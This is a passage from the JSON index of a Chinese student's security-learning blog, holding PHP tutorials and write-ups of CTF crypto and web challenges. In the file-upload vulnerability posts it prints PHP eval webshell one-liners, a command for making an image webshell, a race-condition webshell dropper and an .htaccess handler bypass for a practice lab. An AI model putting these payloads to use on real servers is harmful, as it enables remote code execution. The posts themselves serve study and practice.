必需。规定所搜索的字符串。如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。 before_search 可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。 示例1： 123&lt;?phpecho strstr(&quot;Hello world!&quot;,111);?&gt; 111ASCII码表对应 o ,搜索 o 并且返回字符串的剩余部分： 示例2： 123&lt;?phpecho strstr(&quot;Hello world!&quot;,&quot;world&quot;,true);?&gt; 返回world之前的字符。Hello ! 0×05 字符串截取函数 定义：substr() 函数返回字符串的一部分。语法： substr(string,start,length) 注意：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 12345678910string 必需。规定要返回其中一部分的字符串。start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 示例1： 1234567891011&lt;?phpecho substr(&quot;Hello world&quot;,10).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,1).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,3).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,7).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-1).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-10).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-8).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-4).&quot;&lt;br&gt;&quot;;?&gt; 结果： 12345678dello worldlo worldorlddello worldlo worldorld 示例2： 1234567891011&lt;?phpecho substr(&quot;Hello world&quot;,0,10).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,1,8).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,0,5).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,6,6).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,0,-1).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-10,-2).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,0,-6).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-2-3).&quot;&lt;br&gt;&quot;;?&gt; 结果： 12345678Hello worlello worHelloworldHello worlello worHelloworld 0×06 字符串分割函数 explode() 函数 定义：explode() 函数把字符串打散为数组。 语法： explode(separator,string,limit) 123456789separator 必需。规定在哪里分割字符串。string 必需。要分割的字符串。limit 可选。规定所返回的数组元素的数目。可能的值：大于 0 - 返回包含最多 limit 个元素的数组小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组0 - 返回包含一个元素的数组","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第三周练习(二)Crypto练习(一)","slug":"暑假第三周练习(二)Crypto 练习(一)","date":"2020-07-25T03:46:05.000Z","updated":"2020-08-02T03:19:38.656Z","comments":true,"path":"2020/07/25/暑假第三周练习(二)Crypto 练习(一)/","link":"","permalink":"https://qidian-png.github.io/2020/07/25/%E6%9A%91%E5%81%87%E7%AC%AC%E4%B8%89%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%BA%8C)Crypto%20%E7%BB%83%E4%B9%A0(%E4%B8%80)/","excerpt":"","text":"肝！ 题目来源：BUUCTF 目录：0×01 MD50×02 url编码0×03 看我回旋踢0×04 一眼就解密0×05 摩丝0×06 [BJDCTF 2nd]签到0×07 password0×08 变异凯撒0×09 Quoted-printable0×10 Rabbit0×11 篱笆墙的影子0×12 RSA 0×01 MD5 下载附件，打开是一串字符e00cf25ad42683b3df678c61f42c6bda，根据题目提示MD5提示，可以猜是MD5函数加密。 提交的时候加上flag就是答案。 0×02 url编码 下载附件得到一串符号%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d,一看是URL加密，打开火狐浏览器，里面有url加密解密。 这样会得到flag。 0×03 看我回旋踢 下载附件仍是遗传字符synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}，觉得应该是凯撒密码但是偏移量不知道，只能一个一个试，到偏移量为13时就找到了flag。 0×04 一眼就解密 既有大写又有小写，还有=，看一眼就知道是base64。果然是一眼就解密！ 0×05 摩丝 拿到附件一脸懵逼，看了内容，笑了.. .-.. --- ...- . -.-- --- ..-，摩斯密码。flag{ILOVEYOU} 0×06 [BJDCTF 2nd]签到 下面是base64，上面的数字没搞懂，然后直接解密，就得到flag。上面的数字没有用。 0×07 password 弱口令猜测：zs19900315 0×08 变异凯撒 因为有下划线就不能是字母的变换了，可能是ascll码表。由afZ_ ===&gt;&gt;&gt; flag偏移量就是n+4,从而就能得到flag。 0×09 Quoted-printable Quoted-printable是一种编码方式，文件内容=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6 找个解密网站就行了，字符格式utf8编码。0×10 Rabbit 也是一种编码方式，网上找在线解密。flag到手。 0×11 篱笆墙的影子 栅栏密码？ 试了好大一会，才得到flag，笨方法。 0×12 RSA 以前就听说过RSA，这也是第一次见。 这就需要用的我们的神器 RSA-Tool 2 e在十进制17，工具里十六进制为11。得到的数，加上noxCTF{}，应该就是答案，但是提交了还是不对。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Crypto学习","slug":"Crypto学习","permalink":"https://qidian-png.github.io/tags/Crypto%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第三周练习(一)PHP学习(六)--数组基础","slug":"暑假第三周练习(一)PHP学习(六)--数组基础及进阶","date":"2020-07-21T04:35:05.000Z","updated":"2020-07-31T13:10:50.329Z","comments":true,"path":"2020/07/21/暑假第三周练习(一)PHP学习(六)--数组基础及进阶/","link":"","permalink":"https://qidian-png.github.io/2020/07/21/%E6%9A%91%E5%81%87%E7%AC%AC%E4%B8%89%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)PHP%E5%AD%A6%E4%B9%A0(%E5%85%AD)--%E6%95%B0%E7%BB%84%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%9B%E9%98%B6/","excerpt":"","text":"学习ing！目录：0×01 数组的分类0×02 数组的创建0×03 遍历数组0×04 预定义超全局数组 0×01 数组的分类 分为两种数组索引数组和关联数组 数组的名称为整形时是索引数组，为字符串类型时是关联数组。 0×02 数组的创建 php定义数组时，不需要提前声明，不需要定义大小，直接创建，使用array()创建。数组输出需要使用print_r()函数，或者var_dump()函数。 方法一：直接为数组元素赋值即可创建。 123$stduent[0]&#x3D;12$student[1]&#x3D;&#39;hello&#39;$student[2]&#x3D;&#39;false&#39; 当然索引值可以是整数也可以是字符串，也可以不写，不写索引值默认是 索引数组，从0开始 方法二： 变量名称=array(数据,数据，。。。);不写索引值默认是 索引数组，从0开始，自动分配。 1$student&#x3D;array(10,&quot;你好&quot;，66.66，true)； 方法三：变量名称=array( 索引值=&gt;数据, ………. ); 123456789101112131415161718192021&lt;?php&#x2F;&#x2F;$student&#x3D;array(索引值&#x3D;&gt;具体的值,.......);$student&#x3D;array(10,&#39;孙胜利&#39;,true,60.5);&#x2F;&#x2F;一维数组var_dump($student);$student1&#x3D;array( 0&#x3D;&gt;10, 1&#x3D;&gt;&#39;你好&#39;, 2&#x3D;&gt;true, 3&#x3D;&gt;60.5);var_dump($student1);$student2&#x3D;array( &#39;num&#39;&#x3D;&gt;11, &#39;name&#39;&#x3D;&gt;&#39;你好&#39;, &#39;sex&#39;&#x3D;&gt;true, &#39;grade&#39;&#x3D;&gt;80.5, 10&#x3D;&gt;&#39;dqwdwqdwq&#39;);var_dump($student2);?&gt; 需要调用数组里的某一个值的方法：echo 数组变量名称[索引值] 数据里面还可放数组类型的数据，同一个数组中存储任何类型的数据（类似于C语言的二维数组） 多维数组： 访问数值的方法 变量名称[索引值][索引值]…. 123456789101112131415161718&lt;?php &#x2F;&#x2F;二维数组,多维数组$students&#x3D;array( 0&#x3D;&gt;array(1,&#39;你&#39;,true,60.5), 1&#x3D;&gt;array(2,&#39;好&#39;,true,80.5), 2&#x3D;&gt;array(3,&#39;啊&#39;,false,85.5));&#x2F;*$students&#x3D;array( array(1,&#39;你&#39;,true,60.5), array(2,&#39;好&#39;,true,80.5), array(3,&#39;啊&#39;,false,85.5));*&#x2F;var_dump($students);echo $students[0][1];?&gt; 0×03 遍历数组 类似于其他语言的循环。 注意：count(数组[,1])返回数组里面数据的个数,还可以获取多维数组的个数 ,当然一般我们只传一个数组进去就可以了 ①用for语句来遍历数组 1234567$arr&#x3D;array( &#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;);for($i&#x3D;0;$i&lt;count($arr);$i++)&#123; echo $arr[$i];&#125; 数组元素数量为6 ，输出结果是abcdef。 123456$arr1&#x3D;array( array(1,2,3), array(4,5,6));echo count($arr1);*&#x2F; 这样只会输出第一层的数组，数量为2。 如果我们要输出这个数组的全部的个数，应该怎样？ 12345$arr1&#x3D;array( array(1,2,3), array(4,5,6));echo count($arr1,1);&#x2F;&#x2F;2+6&#x3D;8 这样就可以输出第一层有2个元素，第二层有6个元素，所以总共有8种元素。 for循环的缺点：只适合索引数组，不适合关联数组，但是关联数组在php语言中应用非常广泛，所以for循环用的比较少 ②foreach语句遍历数据 1）foreach(数组变量 as 变量1){ //每次循环执行的语句 变量1代表当前正在经历（访问）的数据 } 123456789&lt;?php $arr1&#x3D;array( &#39;name&#39;&#x3D;&gt;&#39;你好&#39;, &#39;num&#39;&#x3D;&gt;10);foreach($arr1 as $value)&#123; echo $value.&#39;&lt;br &#x2F;&gt;&#39;;&#125;?&gt; 2）foreach(数组变量 as 变量1=&gt;变量2){ //每次循环执行的语句 变量1代表当前正在经历（访问）的数据的索引值 变量1代表当前正在经历（访问）的数据 } 1234567891011&lt;?php $arr1&#x3D;array( &#39;name&#39;&#x3D;&gt;&#39;孙胜利&#39;, &#39;num&#39;&#x3D;&gt;10);foreach($arr1 as $key&#x3D;&gt;$value)&#123; echo $key.&#39;&#x3D;&gt;&#39;.$value.&#39;&lt;br &#x2F;&gt;&#39;;&#125;?&gt; 如何遍历多维数组？递归怎么样？ foreach里面再套一个foreach! 1234567891011121314&lt;?php$arr&#x3D;array( &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, array( 1,2,3,4,5 ));foreach ($arr as $val)&#123; var_dump($val);&#125;?&gt; 这个就可以。但是，我们应该怎样访问array( 1,2,3,4,5 ) 这个数组？？？ 123456789101112131415161718&lt;?php$arr&#x3D;array( &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, array( 1,2,3,4,5 ));foreach ($arr as $val1)&#123; foreach ($val1 as $val2)&#123; echo $val2.&#39;&lt;br &#x2F;&gt;&#39;; &#x2F;&#x2F;var_dump($val2); &#125;&#125; ?&gt; 这样应该就行了。 例子： 1234567891011121314151617181920&lt;?php&#x2F;* * 总结的案例 * *&#x2F;$students&#x3D;array( array(&#39;你&#39;,1,true,60.5), array(&#39;我&#39;,2,true,80.5), array(&#39;他&#39;,3,false,85.5));echo &#39;&lt;table border&#x3D;1&gt;&#39;;foreach ($students as $val)&#123; if($val[2]&#x3D;&#x3D;&#x3D;true)&#123; $val[2]&#x3D;&#39;男&#39;; &#125;else&#123; $val[2]&#x3D;&#39;女&#39;; &#125; echo &quot;&lt;tr&gt;&lt;td&gt;&#123;$val[0]&#125;&lt;&#x2F;td&gt;&lt;td&gt;&#123;$val[1]&#125;&lt;&#x2F;td&gt;&lt;td&gt;&#123;$val[2]&#125;&lt;&#x2F;td&gt;&lt;td&gt;&#123;$val[3]&#125;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&quot;;&#125;echo &#39;&lt;&#x2F;table&gt;&#39;;?&gt; 0×04 预定义超全局数组 已经定义好了（存在）的变量(存放的数据的类型是数组)。 超全局：超级全局变量，作用域（有效区域）！就类似于c语言里头文件包含的函数可以让我们在全局任意位置使用！ 超全局变量一是有全局变量的特性，而是无须声明直接使用。（系统创建及维护） 预定义超全局变量共有九个： 123456789$_GET$_POST$_REQUEST$_SERVER$_ENV$_FILES$_COOKIE$_SESSION$GLOBALS ①get方式比如 ?参数名=参数值&amp;参数名=参数值…… http://127.0.0.1/demo5_3/index.php?参数名=参数值 在服务器端（请求的php文件这边）可以通过$_GET来获取到 $_GET索引值为参数名，索引值对应的数据就是参数值 但是GET的内容会出现在URL框里，所以不是很安全 ②post方式比如表单 post发送过来的！ 可以通过$_POST来获取到! POST方式和GET方式的区别： POST方式安全性好数据传输大小（POST方式大）保存到收藏夹（GET方式） ③$_REQUEST作用: $_REQUEST 主要包含包含 $ _GET 、$_POST、 $_COOKIE数组的信息。注意不要经常使用 $ _REQUEST（因为将多个信息混合）。通过$_SERVER[‘REQUEST_METHOD’]区分GET和POST④ $ _SERVER主要包含了http请求行和消息头的信息，同时还有服务器的一些信息（DOCUMENT_ROOT，SCRIPT_FILENAME…）。⑤获取服务器端的环境变量，通过修改php.ini的variables_order=”EGPCS”启动。⑥包含了全部变量的全局组合数组。当定义一个全局变量，也会被$GLOBALS管理。 11111！！！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第二周练习(二)web学习(一)","slug":"暑假第二周练习(二)web学习(一)","date":"2020-07-17T11:18:05.000Z","updated":"2020-07-31T12:58:00.340Z","comments":true,"path":"2020/07/17/暑假第二周练习(二)web学习(一)/","link":"","permalink":"https://qidian-png.github.io/2020/07/17/%E6%9A%91%E5%81%87%E7%AC%AC%E4%BA%8C%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%BA%8C)web%E5%AD%A6%E4%B9%A0(%E4%B8%80)/","excerpt":"","text":"平常练习，总结一下！ 题目来源：bugkuCTF平台 0×01 web20×02 计算器0×03 web基础GET0×04 web基础$_POST0×05 矛盾0×06 web30×07 域名解析0×08 你必须让他停下 0×01 web2 打开链接就花了很长时间这是个动图，而且越来越快。顿时就没了思路，查看源代码，用F12就找到了flag。 0×02 计算器习惯的输入正确答案。但只能输入一个数字，经过上题，这次直接打开F12查看代码。可输入的最大长度为1，那我们在前端改一下，输入正确答案拿到flag。 0×03 web基础$_GET 拿到题 what这个参数是用get请求来接收值，get请求的参数赋值可以在页面的url中直接进行。 0×04 web基础$_POST 与上道题不同的是这是POST方式提交的。我们可以用火狐里的post data(聪明如我) 0×05 矛盾 第一个if语句里 is_numeric() 函数用于检测变量是否为数字或数字字符串。但是第二个if语句num==1,这就有点矛盾。但是方法有很多比如我突发奇想 num=1%00 0×06 web3点F12打开页面裂开了，没了思路去百度！发现-&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125这是URL解析，复制到txt文本内，改格式为html,然后就可以拿到flag了。 0×07 域名解析 提示：听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag 第一次见，没点头绪。看大佬博客就明白了，就是在电脑的host文件内 C:\\Windows\\System32\\drivers\\etc 将123.206.87.240 flag.baidu.com放在最后一行进行解析，我们可以访问了。 0×08 你必须让他停下 怎么才能停下来？页面一直刷新，F12也看不了。bp看一下 9.jpg的时候flag is here。让他不停刷新，当如果是10.jpg的时候服务器的响应报文中有flag 虽然这些都是基础，对我来说真的很费劲！加油！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://qidian-png.github.io/tags/web%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第二周练习(一)文件上传漏洞(二)","slug":"暑假第二周练习(一)文件上传漏洞(二)","date":"2020-07-16T01:57:05.000Z","updated":"2020-07-31T13:08:37.562Z","comments":true,"path":"2020/07/16/暑假第二周练习(一)文件上传漏洞(二)/","link":"","permalink":"https://qidian-png.github.io/2020/07/16/%E6%9A%91%E5%81%87%E7%AC%AC%E4%BA%8C%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/","excerpt":"","text":"继续总结，烧脑！ 目录： 0×01：白名单限制 0×02：内容限制 0×03：竞争条件 0×01 白名单限制 指名单内都是允许上传的格式。但是试验前，我们需要在php.ini里关闭magic_quotes_gpc函数。常见的的截断：%00截断 和 0×00截断 在upload-labs的第12关里，先看一下源码： 123456789101112131415161718$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &#39;上传出错！&#39;; &#125; &#125; else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 在 ：$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;img_path是拼接而成的，我们可以使用截断。因为是GET方式所以我们用%00截断。因为get传参 的参数 会被 服务器进行URL解码，%00被URL解码之后就是ascii 0。抓包。在这里进行%00截断上传成功。 而靶场的第13关，提交的方式为POST，post不会像get对%00进行自动解码，所以需要在16进制中进行修改00。在然后在Hex中查看机器码这样就截断成功了。 0×02 内容限制 查看源码： 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file &#x3D; fopen($filename, &quot;rb&quot;); $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节 fclose($file); $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin); $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); $fileType &#x3D; &#39;&#39;; switch($typeCode)&#123; case 255216: $fileType &#x3D; &#39;jpg&#39;; break; case 13780: $fileType &#x3D; &#39;png&#39;; break; case 7173: $fileType &#x3D; &#39;gif&#39;; break; default: $fileType &#x3D; &#39;unknown&#39;; &#125; return $fileType;&#125;$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_type &#x3D; getReailFileType($temp_file); if($file_type &#x3D;&#x3D; &#39;unknown&#39;)&#123; $msg &#x3D; &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path &#x3D; UPLOAD_PATH.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &quot;上传出错！&quot;; &#125; &#125;&#125; 检测原理：通过检测文件的前两个字节判断文件类型，满足即可上传。我们可以直接上传图片马。图片吗制作方法：copy normal.jpg /b + shell.php /a webshell.jpg 或者 exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; 1.jpg 用方法一制作， 查看图像给的路径却连不上去， 123456789101112&lt;?php&#x2F;*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*&#x2F;header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);$file &#x3D; $_GET[&#39;file&#39;];if(isset($file))&#123; include $file;&#125;else&#123; show_source(__file__);&#125;?&gt; 在include.php里，对我们传的文件进行PHP解析。所以我我们需要把路径改一下， 这个需要结合文件包含漏洞，连接成功。 0×03 竞争条件 文件上传过程 竞争条件原理网站逻辑：1、网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件。2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。文件上传成功后和删除文件之间存在短的时间差。攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。并行服务器会并发执行多个线程，这就给了不法分子用条件竞争来绕过防护的机会。 攻击者先上传一个图片马shell.php,shell.php的内容是生成另一个图片马webshell.php。shell.php的代码内容： 123&lt;?phpfputs(fopen(&#39;..&#x2F;webshell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&#39;);?&gt; 通过写的方式将写近webshell.php。这就利用时间差上传了webshell。 靶场第18关源码展示： 1234567891011121314151617181920212223$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload &#x3D; true; &#125;else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg &#x3D; &#39;上传出错！&#39;; &#125;&#125; 我们先上传一个文件看其被存起来的路径。现在我们只需要，上传1.php，用burpsuit 拦截数据包，然后将数据包放在burpsuit的爆破模块中。然后访问http://localhost/upload-labs/upload/shell.php同样，将请求拦截，放在burpsuit的爆破模块中。最后，在爆破模块中，让两者同时不断进行，等待那关键的一瞬间就可以了。具体操作：1.对两者都进行抓包，右键，send to intruder2.首先 clear $ ,然后在payload中选择 Nullpayload，然后设置Generate 10000表示没有payload，上传一万次，然后在Option中，设置Number of thread线程数为200 武侠中高手对决，输赢只在一刹那。 在那短短的一刹那，假如你上传的文件，是个 大马套小马呢？大马虽死，但同源文件夹中，小马犹生。一个网站便在弹指一挥间被拿下了。 但是这个需要用到多线程burp suite专业版才会有多线程，我们还需要下载专业版。肝了n个小时。。。还是没成功🤔🤔🤔🤔🤔🤔 仍需努力！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://qidian-png.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"暑假第一周练习(二)文件上传漏洞(一)","slug":"暑假第一周练习(二)文件上传漏洞(一)","date":"2020-07-11T06:35:05.000Z","updated":"2020-07-31T11:39:12.497Z","comments":true,"path":"2020/07/11/暑假第一周练习(二)文件上传漏洞(一)/","link":"","permalink":"https://qidian-png.github.io/2020/07/11/%E6%9A%91%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%BA%8C)%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E4%B8%80)/","excerpt":"","text":"# 文件上传漏洞 目录： 0×01 任意文件上传 0×02 JS限制 0×03 MIME限制 0×04 黑名单限制文件上传漏洞原理：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制或者是过滤用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。 0×01 任意文件上传 没有任何条件限制，可上传任意文件。 直接上传我们的PHP一句话木马 1&lt;?php @eval($_POST[&#39;qidian&#39;]); ?&gt; 上传之后，显示出了文件所在的路径，类型等等。 上传成功代表着我们可以通过webshell访问网站 输入一些命令我们就可以查看网站的一些内容，例如查看网站PHP的版本信息： 1qidian&#x3D;phpinfo(); 可以通过webshell用不同的命令，得到网站的各种信息。当然我们也可以通过菜刀，蚁剑对我们有上传漏洞的网站可视化查看。上图使用蚁剑连接的，对我们webshell上传目录可视化。 0×02 JS限制 所谓JS限制就是在网页前端的JS 代码会对我们上传的文件的后缀或类型进行过滤，限制我们的上传。 123456789101112131415161718192021&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; function checkFile() &#123; var file &#x3D; document.getElementsByName(&#39;upfile&#39;)[0].value; if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123; alert(&quot;你还没有选择任何文件，不能上传!&quot;); return false; &#125; &#x2F;&#x2F;定义允许上传的文件类型 var allow_ext &#x3D; &quot;.jpg|.jpeg|.png|.gif|.bmp|&quot;; &#x2F;&#x2F;提取上传文件的类型 var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F;alert(ext_name); &#x2F;&#x2F;alert(ext_name + &quot;|&quot;); &#x2F;&#x2F;判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123; var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125; &#125; &lt;&#x2F;script&gt; 上面的代码会对我们上传的文件进行过滤，如果满足要求的格式，就允许我们上传，否则不行。我们的绕过方法就是把这段JS代码删除。通过firebug查看元素并删除调用checkFile() 的那句话就行了 绕过后就可以上传成功，查看图像得到上传路径。然后可以用菜刀连接。 我们也可以用BurpSuite抓包，改包进行绕过。 0×03 MIME限制 MIME限制就是文件类型限制。 12if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; 从上面的代码可以看到我们的Content-Type需要满足上面三种之一才可以上传。常见的：超文本标记语言文本 .html,html text/htm 普通文本 .txt text/plain RTF文本. rtf application/rtf GIF图形 .gif image/gif JPEG图形 . jpg image/jpeg PHP文件 .php application/octet-stream类型不对，无法上传。 当我们上传PHP文件时，因为类型不符合以上三种之一，就不能上传。 因此，我们需要通过抓包改包改变MIME 内容。 将Content-Type的内容改为 image/jpeg 就可以绕过MIME限制。 0×04 黑名单限制 文件类型根据黑名单来检测的原理就是：服务器程序根据一份文件后缀名的名单来判断是否允许当前文件上传到服务器，只要上传的文件的类型能够和这个黑名单里面的类型匹配，那么就禁止该文件上传。上面就是黑名单里限制的格式。 我们可以将文件后缀改为 phtml ,php3 ,php5。也可以运用后缀的大小写进行绕过。也可以用后缀加点，加空格，点 +空格+点 绕过等等。 今天用重写文件解析绕过。( .htaccess文件) .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 htaccess文件内容为：SetHandler application/x-httpd-php 123&lt;FilesMatch &quot;jpg&quot;&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; 即我们上传任何格式的文件都会被当作php文件执行。 先上传这样一个后缀为htaccess的文件，在上传一个.jpg的一句话，这样即使上传的一句话后缀为jpg依然可以连接一句话。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://qidian-png.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"暑假第一周练习(一)","slug":"暑假第一周练习(一) Misc","date":"2020-07-10T04:56:05.000Z","updated":"2020-07-31T11:47:14.098Z","comments":true,"path":"2020/07/10/暑假第一周练习(一) Misc/","link":"","permalink":"https://qidian-png.github.io/2020/07/10/%E6%9A%91%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)%20Misc/","excerpt":"","text":"目录： 0×01 Misc之金三胖 0×02 Misc 二维码 0×03 Misc N种方法解决 0×04 Misc 大白 0×05 Misc 基础破解 0×06 Misc 你竟然赶我走 0×07 Misc 乌镇峰会种图 0×08 Misc LSB *0×01金三胖 * 